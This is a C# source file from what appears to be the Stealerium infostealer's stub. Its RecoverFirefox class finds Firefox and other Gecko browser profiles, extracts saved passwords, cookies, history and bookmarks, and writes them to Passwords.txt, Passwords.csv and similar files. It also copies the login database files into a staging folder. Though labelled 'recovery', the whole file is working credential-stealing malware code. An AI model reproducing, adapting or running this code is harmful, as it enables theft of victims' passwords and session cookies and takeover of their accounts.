using System;
using System.IO;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Target.Browsers.Firefox
{
    /// <summary>
    /// Provides functionality to recover Firefox browser data such as bookmarks, cookies, history, and passwords.
    /// </summary>
    internal sealed class RecoverFirefox
    {
        /// <summary>
        /// Recovers Firefox browser data and saves it to the specified path.
        /// </summary>
        /// <param name="sSavePath">The file path where recovered Firefox data will be saved.</param>
        public static void Run(string sSavePath)
        {
            // Validate the provided save path
            if (string.IsNullOrWhiteSpace(sSavePath))
            {
                Logging.Log("RecoverFirefox >> Save path is invalid or empty.");
                return;
            }

            Logging.Log($"RecoverFirefox >> Starting recovery process. Save path: '{sSavePath}'");

            try
            {
                if (Paths.SGeckoBrowserPaths == null || Paths.SGeckoBrowserPaths.Length == 0)
                {
                    Logging.Log("RecoverFirefox >> No Gecko browser paths configured in Paths.SGeckoBrowserPaths.");
                    return;
                }

                // Log the Appdata path for verification
                Logging.Log($"RecoverFirefox >> Appdata path: '{Paths.Appdata}'");

                foreach (var path in Paths.SGeckoBrowserPaths)
                {
                    try
                    {
                        Logging.Log($"RecoverFirefox >> Processing browser path: '{path}'");

                        // Validate the current browser path
                        if (string.IsNullOrWhiteSpace(path))
                        {
                            Logging.Log("RecoverFirefox >> Invalid browser path provided (empty or whitespace). Skipping.");
                            continue;
                        }

                        // Remove any leading directory separators to ensure the path is relative
                        string relativePath = path.TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);

                        Logging.Log($"RecoverFirefox >> Relative browser path after trimming: '{relativePath}'");

                        // Combine Appdata path with the relative browser-specific path
                        string fullBrowserPath = Path.Combine(Paths.Appdata, relativePath);

                        Logging.Log($"RecoverFirefox >> Combined full browser path: '{fullBrowserPath}'");

                        // Ensure the combined path is absolute
                        if (!Path.IsPathRooted(fullBrowserPath))
                        {
                            fullBrowserPath = Path.GetFullPath(fullBrowserPath);
                            Logging.Log($"RecoverFirefox >> Converted to absolute path: '{fullBrowserPath}'");
                        }

                        // Verify if the path exists
                        if (!Directory.Exists(fullBrowserPath))
                        {
                            Logging.Log($"RecoverFirefox >> Browser path does not exist: '{fullBrowserPath}'. Skipping.");
                            continue;
                        }

                        // Retrieve the directory name from the full browser path
                        string name = Path.GetFileName(fullBrowserPath.TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar));
                        if (string.IsNullOrWhiteSpace(name))
                        {
                            Logging.Log($"RecoverFirefox >> Unable to determine directory name from path: '{fullBrowserPath}'. Skipping.");
                            continue;
                        }

                        Logging.Log($"RecoverFirefox >> Browser directory name: '{name}'");

                        // Combine the save path with the directory name to form the destination path
                        string bSavePath = Path.Combine(sSavePath, name);
                        Logging.Log($"RecoverFirefox >> Destination save path: '{bSavePath}'");

                        string browser = fullBrowserPath;

                        // Check if the "Profiles" directory exists within the browser path
                        string profilesPath = Path.Combine(browser, "Profiles");
                        Logging.Log($"RecoverFirefox >> Checking for 'Profiles' directory at: '{profilesPath}'");

                        if (Directory.Exists(profilesPath))
                        {
                            Logging.Log($"RecoverFirefox >> 'Profiles' directory found at: '{profilesPath}'");

                            // Create the destination directory if it doesn't exist
                            if (!Directory.Exists(bSavePath))
                            {
                                Directory.CreateDirectory(bSavePath);
                                Logging.Log($"RecoverFirefox >> Created destination directory: '{bSavePath}'");
                            }
                            else
                            {
                                Logging.Log($"RecoverFirefox >> Destination directory already exists: '{bSavePath}'");
                            }

                            // Recover Firefox data
                            Logging.Log("RecoverFirefox >> Starting data recovery...");

                            var bookmarks = CBookmarks.Get(browser); // Read all Firefox bookmarks
                            var cookies = CCookies.Get(browser);       // Read all Firefox cookies
                            var history = CHistory.Get(browser);       // Read all Firefox history
                            var passwords = CPasswords.Get(browser);   // Read all Firefox passwords

                            Logging.Log("RecoverFirefox >> Data retrieved. Writing to files...");

                            // Write recovered data to respective files using Path.Combine
                            string bookmarksPath = Path.Combine(bSavePath, "Bookmarks.txt");
                            CBrowserUtils.WriteBookmarks(bookmarks, bookmarksPath);
                            Logging.Log($"RecoverFirefox >> Bookmarks written to: '{bookmarksPath}'");

                            string cookiesPath = Path.Combine(bSavePath, "Cookies.txt");
                            CBrowserUtils.WriteCookies(cookies, cookiesPath);
                            Logging.Log($"RecoverFirefox >> Cookies written to: '{cookiesPath}'");

                            string historyPath = Path.Combine(bSavePath, "History.txt");
                            CBrowserUtils.WriteHistory(history, historyPath);
                            Logging.Log($"RecoverFirefox >> History written to: '{historyPath}'");

                            string passwordsTxtPath = Path.Combine(bSavePath, "Passwords.txt");
                            CBrowserUtils.WritePasswordsToTxt(passwords, passwordsTxtPath);
                            Logging.Log($"RecoverFirefox >> Passwords (TXT) written to: '{passwordsTxtPath}'");

                            string passwordsCsvPath = Path.Combine(bSavePath, "Passwords.csv");
                            CBrowserUtils.WritePasswordsToCsv(passwords, passwordsCsvPath);
                            Logging.Log($"RecoverFirefox >> Passwords (CSV) written to: '{passwordsCsvPath}'");

                            // Create a README.txt file in the destination directory
                            string readmePath = Path.Combine(bSavePath, "README.txt");
                            CBrowserUtils.CreateReadme(bSavePath);
                            Logging.Log($"RecoverFirefox >> README.txt created at: '{readmePath}'");

                            // Copy all Firefox login database files
                            string profilesPathFinal = Path.Combine(browser, "Profiles");
                            CLogins.GetDbFiles(profilesPathFinal, bSavePath);
                            Logging.Log($"RecoverFirefox >> Firefox login database files copied to: '{bSavePath}'");

                            Logging.Log("RecoverFirefox >> Data recovery completed successfully.");
                        }
                        else
                        {
                            Logging.Log($"RecoverFirefox >> 'Profiles' directory not found at: '{profilesPath}'. Skipping.");
                        }
                    }
                    catch (ArgumentException argEx)
                    {
                        Logging.Log($"RecoverFirefox >> ArgumentException: {argEx.Message} for path '{path}'");
                    }
                    catch (PathTooLongException pathEx)
                    {
                        Logging.Log($"RecoverFirefox >> PathTooLongException: {pathEx.Message} for path '{path}'");
                    }
                    catch (Exception ex)
                    {
                        Logging.Log($"RecoverFirefox >> Failed to recover data from path '{path}'. Exception: {ex}");
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"RecoverFirefox >> An unexpected error occurred. Exception: {ex.Message}");
            }

            Logging.Log("RecoverFirefox >> Recovery process completed.");
        }
    }
}
